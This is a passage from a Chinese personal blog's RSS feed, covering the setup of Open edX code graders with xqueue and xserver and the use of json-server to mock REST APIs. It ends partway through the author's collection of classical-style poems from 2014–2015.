&lt;p&gt;好啦 ，收尾， 看书去&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 27 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-27:about-open-edx-distributed.html</guid><category>edx</category></item><item><title>Code Grader in Open edX</title><link>/Code-Grader-in-Open-edX.html</link><description>&lt;p&gt;友情提醒： 坑多慎入 : )&lt;/p&gt;
&lt;p&gt;但作为geek的你会很喜欢这部分的&lt;/p&gt;
&lt;p&gt;首先感谢@DatoChan分享的经验 ：）&lt;/p&gt;
&lt;h1&gt;External Grader&lt;/h1&gt;
&lt;p&gt;说Code Grader之前，我们先来说说&lt;a href="http://edx.readthedocs.org/projects/edx-partner-course-staff/en/latest/exercises_tools/external_graders.html#external-grader"&gt;External Grader&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;这是个啥&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;An external grader is a service that receives learner responses to a problem, processes those responses, and returns feedback and a problem grade to the edX platform. You build and deploy an external grader separately from the edX platform.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是一种用于评分的服务，这种评分机制作为独立的服务，接收学生的答题答案，对答案做出评估后，返回评估结果给edX platform.&lt;/p&gt;
&lt;p&gt;技术上的实现主要用到了消息队列，在edx中被封装为&lt;a href="https://github.com/edx/xqueue"&gt;xqueue&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;想象空间&lt;/h3&gt;
&lt;p&gt;这里充满想象的空间，好比可以使用自然语言的成果去自动对答案进行评分，又好比学生可以提交图片，平台使用图片识别去解读它。以及我们稍后介绍的，Code Grader，用于评估学生提交代码的正确性&lt;/p&gt;
&lt;p&gt;如此一来edx platform就可以专注在教育领域，把评分规则交由其他服务，通过这种机制 ，edx platform提高了内聚性的同时，带来了极大的扩展性&lt;/p&gt;
&lt;p&gt;有没有觉得似曾相似，没错，就是《Unix编程艺术》鼓励的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do one thing and do well&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而后通过组件之间的协作和组合来解决问题，而不是提供大而全的方案。&lt;/p&gt;
&lt;p&gt;edx的开放性和可扩展性无疑给大家提供了五彩缤纷的可能&lt;/p&gt;
&lt;h3&gt;Code Grader&lt;/h3&gt;
&lt;p&gt;Code Grader只是External Grader的一个特例，特殊在学生提交的答案是代码，Grader的任务是运行和评估代码的正确性。edX实现了xserver，这是个用以评估Python代码的服务，如果需要，我们可以打造评估任意代码的服务，技术上无非是在Grader里调用解释器而已。&lt;/p&gt;
&lt;p&gt;好想写一个用于评估Hy的Grader呀.(Hy是Python实现的Lisp,与python几乎无缝对接)&lt;/p&gt;
&lt;p&gt;这种拓展性对计算机相关的课程极有助益，学生可以在线编写运行代码，而不必搭建自己的开发环境了。如果涉及数据库的话，后台都可以一并搭建好，学生有一个浏览器即可，而不必折腾一整套编程环境&lt;/p&gt;
&lt;p&gt;Talk is cheap，just do it&lt;/p&gt;
&lt;p&gt;External Grader的核心机制是&lt;a href="https://github.com/edx/xqueue"&gt;xqueue&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;xqueue&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;XQueue defines an interface for the LMS to communicate with external grader services.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一语道尽&lt;/p&gt;
&lt;p&gt;流程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The learner either enters code or attaches a file for a problem, then selects Check.&lt;/li&gt;
&lt;li&gt;The external grader pulls the code from XQueue.&lt;/li&gt;
&lt;li&gt;The external grader runs the tests that you created on the code.&lt;/li&gt;
&lt;li&gt;The external grader returns the grade for the submission, as well as any results in a string, to XQueue.&lt;/li&gt;
&lt;li&gt;The XQueue delivers the results to the edX Learning Management System.&lt;/li&gt;
&lt;li&gt;The learner sees the problem results and the grade.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在grader_payload可以指名test.py.如：{"grader": "ps02/bisect/grade_bisect.py"}&lt;/p&gt;
&lt;p&gt;通过输入输出来测试！在前后输入连个变量，然后测试结果。可以参考官方的示例&lt;/p&gt;
&lt;p&gt;可以直接使用py.test:&lt;a href="https://github.com/dagg/OpenEdxExternalGrader/blob/master/PythonGrader.py"&gt;PythonGrader.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是test case的问题。要求必须写成函数接受参数？写测试用例  每一个test&lt;/p&gt;
&lt;h1&gt;安装与配置&lt;/h1&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;p&gt;依据&lt;a href="https://github.com/antoviaque/xserver-grader"&gt;xserver-grader&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先在&lt;code&gt;playbooks/edx_sandbox.yml&lt;/code&gt;中加入&lt;code&gt;- xserver&lt;/code&gt;到&lt;code&gt;nginx_sites&lt;/code&gt;和&lt;code&gt;roles&lt;/code&gt;中。&lt;/li&gt;
&lt;li&gt;编辑&lt;code&gt;roles/xserver/defaults/main.yml&lt;/code&gt;,加入&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;XSERVER_GRADER_DIR: &amp;quot;{{ xserver_data_dir }}/data/content-test-xserver&amp;quot;
XSERVER_GRADER_SOURCE: &amp;quot;https://github.com/antoviaque/xserver-grader.git&amp;quot;
XSERVER_LOCAL_GIT_IDENTITY: &amp;quot;{{ secure_dir }}/files/git-identity&amp;quot;
XSERVER_GIT_IDENTITY: &amp;quot;YOUR_GITHUB_NAME&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后重新执行ansible-playbook来安装xserver.安装完成后执行&lt;code&gt;sudo /edx/bin/supervisorctl status&lt;/code&gt;应该能看到xserver依据跑起来了。内部端口为8050，外部端口为18050.&lt;/p&gt;
&lt;h3&gt;配置&lt;/h3&gt;
&lt;p&gt;编辑&lt;code&gt;/edx/app/xqueue/xqueue.env.json&lt;/code&gt;，添加你自己的queuename，指名它的url&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;LOCAL_LOGLEVEL&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;INFO&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;LOGGING_ENV&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sandbox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;LOG_DIR&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/edx/var/logs/xqueue&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;RABBIT_HOST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;S3_BUCKET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sandbox-bucket&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;S3_PATH_PREFIX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sandbox-xqueue&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;SYSLOG_SERVER&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;XQUEUES&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;certificates&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;edX-DemoX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://localhost:8050&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;java-queue&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://localhost:1710&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;open-ended&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;open-ended-message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;test-pull&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;XQUEUE_WORKERS_PER_QUEUE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在studio中添加题目，类似以下这种&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;problem&lt;/span&gt; &lt;span class="na"&gt;title=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Embedded Code Box&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;markdown=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;null&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;text&amp;gt;&lt;/span&gt;Blabla&lt;span class="nt"&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;coderesponse&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;textbox&lt;/span&gt; &lt;span class="na"&gt;rows=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;10&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;cols=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;70&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;python&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;tabsize=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;codeparam&lt;/span&gt; &lt;span class="na"&gt;queuename=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;edX-DemoX&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;lt;initial_display/&amp;gt;&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;lt;answer_display&amp;gt;&lt;/span&gt;the definitive answer&lt;span class="nt"&gt;&amp;lt;/answer_display&amp;gt;&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;lt;grader_payload&amp;gt;&lt;/span&gt;{&amp;quot;grader&amp;quot;: &amp;quot;grade.py&amp;quot;}&lt;span class="nt"&gt;&amp;lt;/grader_payload&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/codeparam&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;/coderesponse&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/problem&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;保存，发布，就该就好啦&lt;/p&gt;
&lt;p&gt;更具体的说明，参考&lt;a href="http://edx.readthedocs.org/projects/edx-partner-course-staff/en/latest/exercises_tools/external_graders.html#create-a-code-response-problem"&gt;create-a-code-response-problem&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;填坑&lt;/h1&gt;
&lt;p&gt;有个坑叫&lt;code&gt;DatabaseError: (1406, "Data too long for column 'lms_callback_url' at row 1")&lt;/code&gt; ，解决方案为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo mysql
use xqueue&lt;span class="p"&gt;;&lt;/span&gt;
alter table queue_submission modify lms_callback_url VARCHAR &lt;span class="o"&gt;(&lt;/span&gt;255&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;此外不要在studio中CHECK你的答案，否则会说&lt;code&gt;Error: No grader has been set up for this problem.&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Run it&lt;/h3&gt;
&lt;p&gt;&lt;img alt="xserver1.png" src="img/edx/xqueue/xserver1.png" /&gt;
&lt;img alt="xserver2.png" src="img/edx/xqueue/xserver2.png" /&gt;&lt;/p&gt;
&lt;h3&gt;重启服务&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;sudo /edx/bin/supervisorctl restart xqueue_consumer&lt;/li&gt;
&lt;li&gt;sudo /edx/bin/supervisorctl restart xqueue&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Java Grader&lt;/h1&gt;
&lt;p&gt;参考这里就好：&lt;a href="https://github.com/huynq55/java-grader"&gt;java-grader&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="javaGrader.png" src="img/edx/xqueue/javaGrader.png" /&gt;&lt;/p&gt;
&lt;p&gt;其他语言的实现，可以参考这个，或是xserver&lt;/p&gt;
&lt;h1&gt;设计原则&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-partner-course-staff/en/latest/exercises_tools/external_graders.html#building-an-external-grader"&gt;Building an External Grader&lt;/a&gt;给出了构建自己的External Grader的指导原则&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Scale&lt;/li&gt;
&lt;li&gt;Security&lt;/li&gt;
&lt;li&gt;Reliability and Recovery&lt;/li&gt;
&lt;li&gt;Testing&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;2016.01.19更新&lt;/p&gt;
&lt;p&gt;至于代码judge部分，建议使用专业的judge开源项目，比如为acm竞赛准备的评测组件&lt;/p&gt;
&lt;p&gt;以及这个工具也很棒:&lt;a href="https://github.com/prasmussen/glot"&gt;glot&lt;/a&gt;，他们提供了一套完备的解决方案&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;2016.04.19更新&lt;/p&gt;
&lt;p&gt;使用pytest测试&lt;/p&gt;
&lt;p&gt;&lt;a href="http://pytest.org/latest/getting-started.html#getstarted"&gt;py.test&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/easy-edx/OpenEdxExternalGrader/blob/master/PythonGrader.py"&gt;OpenEdxExternalGrader&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个作为测试的方法，而执行的环境放在docker里，采用-v来映射目录。让代码执行完&lt;/p&gt;
&lt;p&gt;采用&lt;a href="https://github.com/docker/docker-py"&gt;docker-py&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;采用subprogrem 还是 docker-py，先写出要运行的命令，然后再调用&lt;/p&gt;
&lt;h1&gt;用后即删&lt;/h1&gt;
&lt;h1&gt;包括文件和docker 容器&lt;/h1&gt;
&lt;p&gt;sudo docker run --rm -v /tmp/test:/pydata kleetaurus/compilebox python /pydata/test.py&lt;/p&gt;
&lt;p&gt;如何使用远程的docker&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-partner-course-staff/en/latest/exercises_tools/external_graders.html#external-grader"&gt;External Grader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/xqueue"&gt;xqueue&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/xserver"&gt;xserver&lt;/a&gt;*  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://groups.google.com/forum/#!topic/edx-code/-xMxjjg6uv8"&gt;How to configure Xqueue and External grader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/huynq55/java-grader"&gt;java-grader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/xserver/blob/master/protocol.rst"&gt;protocol.rst&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 23 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-23:Code-Grader-in-Open-edX.html</guid><category>edx</category></item><item><title>使用json-server来帮助前后端分离</title><link>/use-json-server.html</link><description>&lt;p&gt;我是个挺工具控的人，平时喜欢收集各种能提高生活质量/工作效率的小工具。&lt;/p&gt;
&lt;p&gt;同时也挺热衷于分享，对于自己爱不释手的工具，总会忍不住想安利给周围的人。&lt;/p&gt;
&lt;p&gt;如果大家用着开心，因为这些工具的帮助，能省下更多的时间去看书/约会/看电影，那么编写这些工具本身，成了一件多么性感而浪漫的事呀&lt;/p&gt;
&lt;p&gt;今天推荐的一款工具叫：&lt;a href="https://github.com/typicode/json-server"&gt;json-server&lt;/a&gt;，在它的帮助下，你能在半分钟之内搭建一个REST API服务器，支持CURD操作&lt;/p&gt;
&lt;h2&gt;前后端分离&lt;/h2&gt;
&lt;p&gt;前后端分离是个很棒的想法。一般而言，开发一个Web应用的时候，我们都会简单地分为前端工程师和后端工程师。职责划分时，通常的做法是前端工程师负责浏览器端用户交互界面和逻辑等，后端负责数据的处理和存储等。可以概括为：后端提供数据，前端负责显示数据。&lt;/p&gt;
&lt;p&gt;在前后端通信中，当前流行的的做法是采用json作为中介，接口采用RESTful的风格&lt;/p&gt;
&lt;p&gt;我们时常面对这样一个问题，前端的工作似乎依赖于后端提供的接口，那么在后端构建好应用之前，前端除了逛github外，就无事可做了，卧槽这不敏捷呀。&lt;/p&gt;
&lt;p&gt;一般公司的做法可能是，先约定好接口，大家按照规范来编程，的确，这样做之后，开发工作就能并行开展了。可是伪造数据是个很烦人的工作呀，尤其是数据的增删改，前端都得手动来写，json这种东西一不小心又容易写错，而且前端开发如果是个团队的话，大家其实都期待有个一致的数据源，基于同样的数据，这样交流起来容易许多。&lt;/p&gt;
&lt;p&gt;在这种情况下你如果遇到&lt;a href="https://github.com/typicode/json-server"&gt;json-server&lt;/a&gt;，该是怎样一种相见恨晚的感觉。&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/typicode/json-server"&gt;json-server&lt;/a&gt;让你迅速搭建器一个REST API服务器，你要做的仅仅需要创建一个json文件即可，完全不必有任何服务器和后端的知识。&lt;/p&gt;
&lt;p&gt;如此一来，前后端分离中容易耦合的部分（接口数据），在开发阶段就被解耦了&lt;/p&gt;
&lt;p&gt;另外，关于前后端分离，阿里内部对此的实践很多，有兴趣的同学可以围观&lt;a href="http://ued.taobao.org/blog/2014/04/full-stack-development-with-nodejs/"&gt;前后端分离的思考与实践&lt;/a&gt;.去年去阿里参加了一个会议，他们分享了不少这一块的经验和前车之鉴，挺引人深思的。&lt;/p&gt;
&lt;h2&gt;json-server的安装与使用&lt;/h2&gt;
&lt;h3&gt;本地安装&lt;/h3&gt;
&lt;p&gt;首先你本地要装有nodejs。之后直接安装json-server：&lt;code&gt;sudo npm install -g json-server&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;使用docker&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://github.com/clue/docker-json-server"&gt;这里&lt;/a&gt;.&lt;br /&gt;
几乎也是一键式的：&lt;code&gt;docker run -d -p 80:80 -v /home/user/articles.json:/data/db.json clue/json-server&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;使用&lt;/h3&gt;
&lt;p&gt;创建一个json文件，类似这样&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;posts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;json-server&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;author&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;typicode&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;],&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;comments&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;some comment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;postId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;],&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;profile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;typicode&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;万事具备，可以开始啦：&lt;code&gt;json-server --watch db.json&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在浏览器中打开&lt;code&gt;http://127.0.0.1:3000/&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;对于当前这个例子，请求所有数据为http://127.0.0.1:3000/db&lt;/p&gt;
&lt;h3&gt;CURD操作&lt;/h3&gt;
&lt;p&gt;采用RESTful风格，可以使用Postman或httpie来测试&lt;/p&gt;
&lt;p&gt;以httpie来演示&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http delete 127.0.0.1:3000/posts &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;wwj
&lt;span class="c1"&gt;#response: HTTP/1.1 201 Created&lt;/span&gt;
http post 127.0.0.1:3000/posts/2 
&lt;span class="c1"&gt;#response: HTTP/1.1 200 OK &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;值得说明的一点是，json-server支持跨域请求（实际上跨域是一个安全策略问题，浏览器端总是能发送跨域请求的，重点在服务器端是不是愿意接受，json-server处于开发的便利愿意接受跨域请求，所以用户直接在静态文件里就能开发ajax程序！）,如果我们在ubuntu上部署的话，记得&lt;code&gt;ln -s /usr/bin/nodejs /usr/bin/node&lt;/code&gt;,否则会说找不到node&lt;/p&gt;
&lt;h2&gt;在edX开发中的应用&lt;/h2&gt;
&lt;p&gt;开发xblock组件时，前后端通信也是采用json，json-server很适合用来模拟后端的数据&lt;/p&gt;
&lt;h2&gt;后记&lt;/h2&gt;
&lt;p&gt;这半年来，对优化workflow兴趣浓厚，大概可以表述为对如下命题的兴趣：如何使用开源工具来优化公司内部的日常工作流，包括但不限于自动化测试，提供基础服务，自动化办公 。 先后在公司内部搭建了私有论坛，代码托管，私有文件存储，内网映射服务&lt;/p&gt;
&lt;p&gt;之后有可能，很适合将json-server构建为公司内部使用的在线服务，开发者们只需要在线编写初始化的json文件，服务便可跑起来，为前端开发者提供 REST API&lt;/p&gt;
&lt;p&gt;技术上实现很简单，使用flask搭建一个在线服务,提供一个在线编辑器&lt;a href="https://github.com/codemirror/CodeMirror"&gt;CodeMirror&lt;/a&gt;，将格式正确的json保存为文件，之后在flask中调用子线程把服务跑起来就行&lt;/p&gt;
&lt;p&gt;如果不考虑安全的话，就更简单，启用一个json-server即可，用户各自在自己的区域做操作即可（诸如我只在/wwj下做操作），互不干扰。初始化的数据，可以用httpie脚本化生成&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 23 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-23:use-json-server.html</guid><category>dev-tools</category></item><item><title>种瓜集(2014.06-2015.10)</title><link>/2015-my-poem.html</link><description>&lt;p&gt;毕业一年多来，过着简单率性的生活，读书不如在校时多，选书慎重不少；朋友倒是新交不少，大都志趣相投&lt;/p&gt;
&lt;p&gt;依然有用诗词记录生活的习惯，只是不发论坛，不合律的地方，也不费心雕琢了。&lt;/p&gt;
&lt;p&gt;诗无大用，聊以纪年。&lt;/p&gt;
&lt;p&gt;整理一下毕业至今(2015/10/21)的诗词&lt;/p&gt;
&lt;hr /&gt;
&lt;div font-size="25px"&gt;
&lt;pre&gt;

傍晚 老门东一带（15.10.17）
影长转觉夕阳好，
香远方知巷子深。
光阴流过青石板，
炖肉谁家惑路人。

玄武湖夜景（15.10.16）
灯如唇色有余温，
隔水喧嚣渐不闻。
路转亭边惊回首，
桂花香似那年人。

十一一组
路过@老杨的大西北（15.10.01）
群山峻且长，
有水浊而黄。
故人志所在，
射雕与牧羊。

回西宁路上（15.10.04）

夜骑
迟来无帐篷，
刺眼远车灯。
沿途相伴者，
北斗与风声。

西海回西宁路上
秋来山色叠，
山间水未竭。
羊群饮于此，
饮罢水边歇。
牧者坐石上，
垂垂已梦蝶。

环青海湖未遂
此处山有棱，
此行堪结绳。
此去将怀念，
牛羊多呆萌。

兰州回南京车上，午觉醒来（15.10.06）
阳光午后透窗来，
过道追逐几小孩。
遥想阿谁能对坐，
山河看倦漫托腮。

浣溪沙 · 一早醒来收到久没联系的好友消息（15.09.18）
知己人间竟可能，
卧谈昔日夜三更，
话题合纵与连横。

新雪来时已备酒，
故人去后渐藏锋。
晚来可待子猷程。

于江宁爱情隧道（15.09.13）
一天风景到晚晴，
斜阳影里远山青。
风来乱窜钻裤脚，
坐等半融冰激凌「注」
注：朕口味独特，喜欢化了一半的冰淇淋

明天依然是愉快的周末，矫情地记一笔（15.09.12）
有限年华有限身，
溺于风景溺红尘。
兴致来时欣以往，
妙书妙事与妙人。

回南京路上（15.09.05）

其一
身后城渐远，
眼前山叠山。
故乡成过往，
记取宝石蓝
其二
铁路山头过，
山脚有人家。
田间归来者，
衣襟带晚霞

回家一组（15.09.03）

其一
我自小城北，
行至小城南。
小城秋风里，
转念忆长安。

其二
车过水东桥，
车过水南桥。
车停西桥站，
转身见刀削。「注」

其三
故人千里远，
千里何迢迢。
吃货曾同往，
钟爱此刀削。

注：路过某小伙伴最钟爱的刀削面，可惜这个带汤真心没法寄orz

骑车闲逛，路过月牙湖（15.08.13）
于此镜头留一帧，
倚桥背影正出神。
夜色偏宜小动作，
晚风挑逗候车人。

怀念一下各位，好想参加最后一天的活动（15.07.29）
ps:今天晚餐好丰盛
聚此忘忧且忘言，
桃源之外不知年。
水面风来最解暑，
纷纷妙语绽如莲

记一次奇妙的夏令营(15.07.25)
亭边卧水小楼台，
楼内诸君脑洞开。
清风午后穿堂过，
阵雨窗前涉水来。
或许青灯真可隐，
依然红粉最怜才。
侧耳听人说画室，
从今不愿拭尘埃。「注1」
注1：“贾科梅蒂尊重所有的物质，连安妮特破坏了玻璃上的灰尘，他都会生气。”——《贾科梅蒂的画室》

年假之 住处真棒（15.07.23）
